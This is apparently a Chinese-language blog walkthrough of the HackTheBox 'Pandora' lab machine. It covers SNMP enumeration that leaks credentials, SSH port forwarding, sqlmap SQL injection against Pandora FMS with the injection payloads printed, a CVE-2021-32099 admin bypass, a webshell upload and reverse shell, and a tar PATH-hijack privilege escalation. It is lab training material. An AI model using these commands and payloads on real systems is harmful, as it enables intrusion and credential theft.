---
title: Pandora
date: 2022-01-29 12:52:11
tags: HackThebox
categories: CMS
---

## 信息收集
使用nmap进行扫描，发现开放了ssh和web服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/48eada2d8ed648a595409ecb9caca3d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
访问web服务后，并且进行了目录扫描，并没有发现有价值的信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/fe6b324e74084ed0928913421517ca43.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

![在这里插入图片描述](https://img-blog.csdnimg.cn/ed3d2aea22f248afb8426175c235d2c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

切换一个思路，看看有没有子域名，结果也是落空

```bash
wfuzz -c -u "http://pandora.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 33560 -H "HOST:FUZZ.pandora.htb"
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/afadb89eddb94b41bdfafaf6a93b236f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
至此，我的思路断了。想了很久发现会不会信息收集的时候做得不够细，然后再去扫描UDP的端口服务，有发现新的突破口。目标主机开放了snmp服务，我们可以使用snmpwalk工具对snmp的信息进行更仔细地扫描。

```bash
nmap -sV -sC -A -sU -oN udp_result -top-ports=20 pandora.htb
```

> **注：-top-ports参数是扫描开放概率最高的 number 个端口，出现的概率需要 参考 nmap-services 文件**

![在这里插入图片描述](https://img-blog.csdnimg.cn/18f56ac60b064d3f8f0a54448943b8dd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

```bash
snmpwalk -v 2c pandora.htb -c public > pandora.snmp
```
信息量比较大，需要我们一点点仔细地搜索，发现存在了账户和密码。
![在这里插入图片描述](https://img-blog.csdnimg.cn/1dad4db69f9c4b5cac4313a48bfdd81c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 漏洞利用
我们尝试登录，发现还存在另一个用户matt，但是没有权限查看到user.txt文件，目测应该是要提权到matt用户权限上去
![在这里插入图片描述](https://img-blog.csdnimg.cn/62b8997975c64b5d8c6401a090658316.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
查看对应的端口服务时，发现本地运行了一个web服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/25dd276877264e0db29d0adf34018fcc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/d864bcd769264cf58355770bea67dd43.png)
那么思路来了，我们可以利用端口转发技术，将目标机器的80端口转发到本机的80端口上进行访问。

```bash
ssh -L 80:127.0.0.1:80 daniel@pandora.htb
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/caadd0a4e8a04a66950947136404bca3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
紧接着我们访问本机的80端口，发现是一个pandora的FMS框架搭建的web服务，并且版本是`v7.0NG.742`
![在这里插入图片描述](https://img-blog.csdnimg.cn/cc07c69796d8428aa962521a3aba1d6a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
在搜索引擎上搜到，存在SQL注入的可能性，并且在相对应的目录上存在SQL注入漏洞。
![在这里插入图片描述](https://img-blog.csdnimg.cn/44fd0991127a4d16ba6a36debf10b49d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/84f551a7ff9e4e7b9e1224d1a92ac12a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

那么就使用SQLMAP进行尝试注入吧，结果显示真的存在GET注入，数据库类型为MySQL

```bash
sqlmap -u "http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1" --batch
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/ed03893394f6472ea708afa9cf6bd75c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
查看数据库名、数据表等信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/8269e50d7ce543b5a8db603075863fec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

```bash
sqlmap -u "http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1" --batch --dbms=mysql -D pandora --tables
        ___
       __H__                                                                                                                                       
 ___ ___[.]_____ ___ ___  {1.6#stable}                                                                                                             
|_ -| . [']     | .'| . |                                                                                                                          
|___|_  [.]_|_|_|__,|  _|                                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:29:53 /2022-01-28/

[22:29:54] [INFO] testing connection to the target URL
[22:29:54] [WARNING] potential permission problems detected ('Access denied')
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=6ehkvd19mc3...lt5pi9cq7a'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: session_id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: session_id=1' AND 7308=(SELECT (CASE WHEN (7308=7308) THEN 7308 ELSE (SELECT 8935 UNION SELECT 7585) END))-- -

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: session_id=1' OR (SELECT 8665 FROM(SELECT COUNT(*),CONCAT(0x716b707a71,(SELECT (ELT(8665=8665,1))),0x7171717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- aGWu

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session_id=1' AND (SELECT 3440 FROM (SELECT(SLEEP(5)))OagF)-- HMIA
---
[22:29:54] [INFO] testing MySQL
[22:29:54] [INFO] confirming MySQL
[22:29:54] [WARNING] reflective value(s) found and filtering out
[22:29:54] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[22:29:54] [INFO] fetching tables for database: 'pandora'
Database: pandora
[178 tables]
+------------------------------------+
| taddress                           |
| taddress_agent                     |
| tagent_access                      |
| tagent_custom_data                 |
| tagent_custom_fields               |
| tagent_custom_fields_filter        |
| tagent_module_inventory            |
| tagent_module_log                  |
| tagent_repository                  |
| tagent_secondary_group             |
| tagente                            |
| tagente_datos                      |
| tagente_datos_inc                  |
| tagente_datos_inventory            |
| tagente_datos_log4x                |
| tagente_datos_string               |
| tagente_estado                     |
| tagente_modulo                     |
| talert_actions                     |
| talert_commands                    |
| talert_snmp                        |
| talert_snmp_action                 |
| talert_special_days                |
| talert_template_module_actions     |
| talert_template_modules            |
| talert_templates                   |
| tattachment                        |
| tautoconfig                        |
| tautoconfig_actions                |
| tautoconfig_rules                  |
| tcategory                          |
| tcluster                           |
| tcluster_agent                     |
| tcluster_item                      |
| tcollection                        |
| tconfig                            |
| tconfig_os                         |
| tcontainer                         |
| tcontainer_item                    |
| tcredential_store                  |
| tdashboard                         |
| tdatabase                          |
| tdeployment_hosts                  |
| tevent_alert                       |
| tevent_alert_action                |
| tevent_custom_field                |
| tevent_extended                    |
| tevent_filter                      |
| tevent_response                    |
| tevent_rule                        |
| tevento                            |
| textension_translate_string        |
| tfiles_repo                        |
| tfiles_repo_group                  |
| tgis_data_history                  |
| tgis_data_status                   |
| tgis_map                           |
| tgis_map_connection                |
| tgis_map_has_tgis_map_con          |
| tgis_map_layer                     |
| tgis_map_layer_groups              |
| tgis_map_layer_has_tagente         |
| tgraph                             |
| tgraph_source                      |
| tgraph_source_template             |
| tgraph_template                    |
| tgroup_stat                        |
| tgrupo                             |
| tincidencia                        |
| titem                              |
| tlanguage                          |
| tlayout                            |
| tlayout_data                       |
| tlayout_template                   |
| tlayout_template_data              |
| tlink                              |
| tlocal_component                   |
| tlog_graph_models                  |
| tmap                               |
| tmensajes                          |
| tmetaconsole_agent                 |
| tmetaconsole_agent_secondary_group |
| tmetaconsole_event                 |
| tmetaconsole_event_history         |
| tmetaconsole_setup                 |
| tmigration_module_queue            |
| tmigration_queue                   |
| tmodule                            |
| tmodule_group                      |
| tmodule_inventory                  |
| tmodule_relationship               |
| tmodule_synth                      |
| tnetflow_filter                    |
| tnetflow_report                    |
| tnetflow_report_content            |
| tnetwork_component                 |
| tnetwork_component_group           |
| tnetwork_map                       |
| tnetwork_matrix                    |
| tnetwork_profile                   |
| tnetwork_profile_component         |
| tnetworkmap_ent_rel_nodes          |
| tnetworkmap_enterprise             |
| tnetworkmap_enterprise_nodes       |
| tnews                              |
| tnota                              |
| tnotification_group                |
| tnotification_source               |
| tnotification_source_group         |
| tnotification_source_group_user    |
| tnotification_source_user          |
| tnotification_user                 |
| torigen                            |
| tpassword_history                  |
| tperfil                            |
| tphase                             |
| tplanned_downtime                  |
| tplanned_downtime_agents           |
| tplanned_downtime_modules          |
| tplugin                            |
| tpolicies                          |
| tpolicy_agents                     |
| tpolicy_alerts                     |
| tpolicy_alerts_actions             |
| tpolicy_collections                |
| tpolicy_groups                     |
| tpolicy_modules                    |
| tpolicy_modules_inventory          |
| tpolicy_plugins                    |
| tpolicy_queue                      |
| tprofile_view                      |
| tprovisioning                      |
| tprovisioning_rules                |
| trecon_script                      |
| trecon_task                        |
| trel_item                          |
| tremote_command                    |
| tremote_command_target             |
| treport                            |
| treport_content                    |
| treport_content_item               |
| treport_content_item_temp          |
| treport_content_sla_com_temp       |
| treport_content_sla_combined       |
| treport_content_template           |
| treport_custom_sql                 |
| treport_template                   |
| treset_pass                        |
| treset_pass_history                |
| tserver                            |
| tserver_export                     |
| tserver_export_data                |
| tservice                           |
| tservice_element                   |
| tsesion                            |
| tsesion_extended                   |
| tsessions_php                      |
| tskin                              |
| tsnmp_filter                       |
| ttag                               |
| ttag_module                        |
| ttag_policy_module                 |
| ttipo_modulo                       |
| ttransaction                       |
| ttrap                              |
| ttrap_custom_values                |
| tupdate                            |
| tupdate_journal                    |
| tupdate_package                    |
| tupdate_settings                   |
| tuser_double_auth                  |
| tuser_task                         |
| tuser_task_scheduled               |
| tusuario                           |
| tusuario_perfil                    |
| tvisual_console_elements_cache     |
| twidget                            |
| twidget_dashboard                  |
+------------------------------------+

[22:29:54] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 22:29:54 /2022-01-28/
```
这里重点关注两个数据库`tsessions_php`和`tpassword_history`，分别对这两个数据表的字段内容进行注入分析。因为tsessions_php的字段内容比较多，这里不再赘述。主要分析的是后者的字段内容信息。
![在这里插入图片描述](https://img-blog.csdnimg.cn/b7e6dbfbe3d443c78888e862a89eed3e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/b6bded70d34c46b1a18a13a217c21b7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

```bash
sqlmap -u "http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1" --batch --dbms=mysql -D pandora -T tpassword_history -C date_begin,date_end,id_pass,id_user,password --dump
```
得到了matt用户的hash值，但是很可惜并不能解密出对应的明文值信息。因此我们只能换一个思路了。
![在这里插入图片描述](https://img-blog.csdnimg.cn/6f758c4b67394f73be33a91e9518b67c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 提权
继续在网上查阅资料发现，存在一个poc能直接使用admin账户进行登录后台，这是链接地址[https://github.com/zjicmDarkWing/CVE-2021-32099](https://github.com/zjicmDarkWing/CVE-2021-32099)
![在这里插入图片描述](https://img-blog.csdnimg.cn/98310996012a4ee6b1a2c970d72d04ae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
登录成功后，发现存在一个文件上传的点，这里我们可以上传webshell
![在这里插入图片描述](https://img-blog.csdnimg.cn/a47737aa634c4cec91d3fd880a38c75d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
随便点击一个目录，url上提示是images目录
![在这里插入图片描述](https://img-blog.csdnimg.cn/e1ee7e89e35c4b97b1c0f57895caded0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
上传webshell后，打开监听并获取反弹的shell
![在这里插入图片描述](https://img-blog.csdnimg.cn/2f98f37576d14269a134646cf7a3e27f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 提权ROOT
获取到matt用户的权限后，我们的下一个目标就是最高权限了。首先我们先查看可执行的二进制文件都有哪些。最显眼的是`/usr/bin/pandora_backup`这个可执行文件目录，我们可以尝试执行它。

```bash
find / -type f -perm -u=s 2>/dev/null
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/98051e0814b44154b2e0ab038a77f571.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
但是报了权限不够的错误，并且不但权限不够，因此我们需要一个更加稳定的shell外壳。
![在这里插入图片描述](https://img-blog.csdnimg.cn/e1ae01ac699e4398bdc9dc69a131fc44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

由于我们并没有解密到matt用户的明文密码，因此我们只能手撕ssh连接了。
![在这里插入图片描述](https://img-blog.csdnimg.cn/6cd2cba3f9724a5aa9e3ffff6c345b8f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
生成了id_rsa文件后，我们得再生成一个验证文件，并且全部都设置为可读可写权限，但是不能执行。
![在这里插入图片描述](https://img-blog.csdnimg.cn/ebcbf9930fdc474ca8cc9b360eb48af6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后我们把id_rsa的内容保存在本地上
![在这里插入图片描述](https://img-blog.csdnimg.cn/fb32e81db1424168bfc18bcba009b3c5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/7db0877f59e04a3595eea89001efb8ec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
再次执行之前的备份命令时，发现执行成功了
![在这里插入图片描述](https://img-blog.csdnimg.cn/5d11948fcb0248849fb147a9ca08d345.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后我们的思路又来了，既然这个是个可执行的二进制文件，那么我们可以将root的shell路径写入到tar命令中，从而获取最高的权限。
![在这里插入图片描述](https://img-blog.csdnimg.cn/3491c9fa9d5c4fda99e0b2c641d66904.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

![在这里插入图片描述](https://img-blog.csdnimg.cn/83e5ff7b6e2e4c56afd37607ba212552.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 总结
总的来说，这是一个难度适中的靶机，相信一开始获取snmp突破口那里已经死了一大部分人了，然后就是后面sql注入成功后但是却没法解密，所以这个靶机相当出色，比较考验漏洞复现的技能。
